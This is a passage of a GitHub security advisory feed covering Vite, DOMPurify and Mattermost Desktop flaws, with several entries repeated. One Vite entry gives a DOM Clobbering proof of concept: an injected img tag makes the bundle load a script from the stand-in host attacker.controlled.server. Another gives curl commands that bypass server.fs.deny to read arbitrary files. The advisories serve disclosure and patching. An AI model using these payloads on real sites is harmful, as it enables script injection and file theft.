<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-17T19:28:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-17T18:44:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-17T18:44:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-17T18:44:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-17T18:44:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-17T18:44:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify allows tampering by prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-mmhx-hmjr-r674</id>
        <link href="https://github.com/advisories/GHSA-mmhx-hmjr-r674"/>
        <updated>2024-09-16T22:37:33.000Z</updated>
        <content type="html"><![CDATA[<p>It has been discovered that malicious HTML using special nesting techniques can bypass the depth checking added to DOMPurify in recent releases. It was also possible to use Prototype Pollution to weaken the depth check.</p>
<p>This renders dompurify unable to avoid XSS attack.</p>
<p>Fixed by <a href="https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21">https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21</a> (3.x branch) and <a href="https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc">https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc</a> (2.x branch).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674">https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21">https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc">https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45801">https://nvd.nist.gov/vuln/detail/CVE-2024-45801</a></li>
<li><a href="https://github.com/advisories/GHSA-mmhx-hmjr-r674">https://github.com/advisories/GHSA-mmhx-hmjr-r674</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mmhx-hmjr-r674</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-16T20:34:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify allows tampering by prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-mmhx-hmjr-r674</id>
        <link href="https://github.com/advisories/GHSA-mmhx-hmjr-r674"/>
        <updated>2024-09-16T22:37:33.000Z</updated>
        <content type="html"><![CDATA[<p>It has been discovered that malicious HTML using special nesting techniques can bypass the depth checking added to DOMPurify in recent releases. It was also possible to use Prototype Pollution to weaken the depth check.</p>
<p>This renders dompurify unable to avoid XSS attack.</p>
<p>Fixed by <a href="https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21">https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21</a> (3.x branch) and <a href="https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc">https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc</a> (2.x branch).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674">https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21">https://github.com/cure53/DOMPurify/commit/1e520262bf4c66b5efda49e2316d6d1246ca7b21</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc">https://github.com/cure53/DOMPurify/commit/26e1d69ca7f769f5c558619d644d90dd8bf26ebc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45801">https://nvd.nist.gov/vuln/detail/CVE-2024-45801</a></li>
<li><a href="https://github.com/advisories/GHSA-mmhx-hmjr-r674">https://github.com/advisories/GHSA-mmhx-hmjr-r674</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mmhx-hmjr-r674</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-16T20:34:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mattermost-desktop] Mattermost Desktop App fails to sufficiently configure Electron Fuses]]></title>
        <id>https://github.com/advisories/GHSA-xgq9-7gw6-jr5r</id>
        <link href="https://github.com/advisories/GHSA-xgq9-7gw6-jr5r"/>
        <updated>2024-09-16T20:21:00.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Desktop App versions &lt;=5.8.0 fail to sufficiently configure Electron Fuses which allows an attacker to gather Chromium cookies or abuse other misconfigurations via remote/local access.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45835">https://nvd.nist.gov/vuln/detail/CVE-2024-45835</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-xgq9-7gw6-jr5r">https://github.com/advisories/GHSA-xgq9-7gw6-jr5r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xgq9-7gw6-jr5r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-16T15:32:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mattermost-desktop] Mattermost Desktop App fails to safeguard screen capture functionality]]></title>
        <id>https://github.com/advisories/GHSA-5777-rcjj-9p22</id>
        <link href="https://github.com/advisories/GHSA-5777-rcjj-9p22"/>
        <updated>2024-09-16T20:20:50.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Desktop App versions &lt;=5.8.0 fail to safeguard screen capture functionality which allows an attacker to silently capture high-quality screenshots via JavaScript APIs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39772">https://nvd.nist.gov/vuln/detail/CVE-2024-39772</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-5777-rcjj-9p22">https://github.com/advisories/GHSA-5777-rcjj-9p22</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5777-rcjj-9p22</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-16T15:32:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mattermost-desktop] Mattermost Desktop App Uncontrolled Search Path Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wj4j-qc2m-fgh7</id>
        <link href="https://github.com/advisories/GHSA-wj4j-qc2m-fgh7"/>
        <updated>2024-09-16T20:14:54.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Desktop App versions &lt;=5.8.0 fail to&nbsp;specify an absolute path when searching the cmd.exe file, which allows a local attacker who is able to put an cmd.exe file in the Downloads folder of a user's machine to cause remote code execution on that machine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39613">https://nvd.nist.gov/vuln/detail/CVE-2024-39613</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://docs.mattermost.com/about/desktop-app-changelog.html">https://docs.mattermost.com/about/desktop-app-changelog.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wj4j-qc2m-fgh7">https://github.com/advisories/GHSA-wj4j-qc2m-fgh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wj4j-qc2m-fgh7</uri>
        </author>
